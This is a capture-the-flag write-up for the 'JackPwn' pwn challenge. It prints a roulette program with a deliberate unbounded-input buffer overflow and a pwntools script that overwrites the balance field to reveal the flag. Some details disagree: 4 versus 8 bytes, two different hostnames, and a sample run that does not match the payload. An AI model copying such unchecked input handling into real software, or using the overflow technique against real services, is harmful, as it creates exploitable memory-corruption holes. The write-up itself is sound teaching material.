---
title: "Breizh CTF 2025 - JackPwn"
date: 2025-04-14
tags: ["buffer-overflow", "exploitation"]
categories: ["pwn"]
ctfs: ["breizh-ctf"]
---

# JackPwn - Breizh CTF 2025

## Challenge Description

JackPwn is a Pwn category challenge from Breizh CTF 2025. It simulates a roulette game with a vulnerability.

## Binary Analysis

Here is the source code of the binary:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define MISE 2

const char roulette[] = "xRNRNRNRNRNNRNRNRNRRNRNRNRNRNNRNRNRNR";

void read_input(char *buf) {
    char c;
    while (1) {
        c = getchar();
        if (c == '\n') {
            *(buf++) = 0;
            break;
        } else if (c == EOF) {
            exit(0);
        }
        *(buf++) = c;
    }
}

int get_random_number() {
    return 1 + (random() % 36);
}

int main() {
    int bille;
    char gagne;
    char valide, rouge, noir, pair, impair;

    struct {
        char mise[32];
        int solde;
    } ctx;

    ctx.solde = 50;

    srand(time(NULL));

    while (ctx.solde > 0) {
        valide = rouge = noir = pair = impair = 0;
        gagne = 0;

        do {
            printf("Solde : %d\n", ctx.solde);
            printf("Votre mise : ");
            fflush(stdout);
            read_input(ctx.mise);

            if (!strcmp(ctx.mise, "rouge")) {
                valide = rouge = 1;
            } else if (!strcmp(ctx.mise, "noir")) {
                valide = noir = 1;
            } else if (!strcmp(ctx.mise, "pair")) {
                valide = pair = 1;
            } else if (!strcmp(ctx.mise, "impair")) {
                valide = impair = 1;
            } else {
                puts("Mise invalide");
            }
        } while (!valide);

        bille = get_random_number();
        printf("La bille s'est stoppée sur la case %d (%c)\n", bille, roulette[bille]);

        if (rouge && roulette[bille] == 'R') {
            gagne = 1;
        } else if (noir && roulette[bille] == 'N') {
            gagne = 1;
        } else if (pair && ((bille % 2) == 0)) {
            puts("pair");
            gagne = 1;
        } else if (impair && ((bille % 2) == 1)) {
            puts("impair");
            gagne = 1;
        } else {
            gagne = 0;
        }

        if (gagne) {
            puts("Gagné");
            ctx.solde += MISE;
        } else {
            puts("Perdu");
            ctx.solde -= MISE;
        }

        if (ctx.solde == 0x1337) {
            char *flag = getenv("FLAG");
            if (flag == NULL) {
                puts("fake_flag");
            } else {
                puts(flag);
            }
            return 0;
        }
    }
}
```

After analysis, we can identify several key points:

1. The program simulates a roulette game where the player can bet on "rouge" (red), "noir" (black), "pair" (even), or "impair" (odd)
2. A `ctx` structure contains two elements:
   - `mise[32]`: a 32-byte buffer to store the bet
   - `solde`: an integer representing the player's balance
3. The flag is displayed only if the balance reaches exactly 0x1337 (4919 in decimal)
4. The `read_input()` function reads characters until it encounters a newline, without checking the buffer size
5. With an initial balance of 50 and gains/losses of only 2, it would take a huge number of rounds to reach 4919

## Vulnerability

The main vulnerability is a classic buffer overflow in the `read_input()` function:

```c
void read_input(char *buf) {
    char c;
    while (1) {
        c = getchar();
        if (c == '\n') {
            *(buf++) = 0;
            break;
        } else if (c == EOF) {
            exit(0);
        }
        *(buf++) = c;
    }
}
```

This function does not check the buffer size and continues writing until it encounters a newline. Moreover, when this function is called, the buffer passed as a parameter is `ctx.mise`, which is only 32 bytes. If you enter more than 32 characters, you will overflow into the `solde` field, which is located just after in memory.

## Exploitation

The exploitation strategy is simple:
1. Fill the 32-byte `mise` buffer
2. Write exactly 4 more bytes with the value 0x1337 (4919) into `solde`
3. The value will be considered valid because the buffer is null-terminated (added by `read_input`)

Here is how to exploit this vulnerability:

```python
from pwn import *

HOST = "jackpwn-180.chall.ctf.bzh"
PORT = 1337

p = remote(HOST, PORT)

payload = b"rouge".ljust(32, b"\x00")  
payload += p64(0x1335)                 #0x1337 - 2 align on 64 bits 

p.recvuntil(b"Votre mise : ")
p.sendline(payload)

while True:
    try:
        line = p.recvline(timeout=1).decode().strip()
        print(line)
        if "BZHCTF{" in line:
            break
    except:
        break

p.close()

```

## Flag

After running the exploit, the program detects that the balance is exactly 0x1337 and displays the flag:

```
$ python3 exploit.py
[+] Opening connection to jackpwn.chall.ctf.bzh on port 1337: Done
[+] Receiving all data: Done
[*] Closed connection to jackpwn.chall.ctf.bzh port 1337
Mise invalide
Solde : 4919
Votre mise : 
BZHCTF{j4ckp0t_0v3rfl0w_ftw}
```
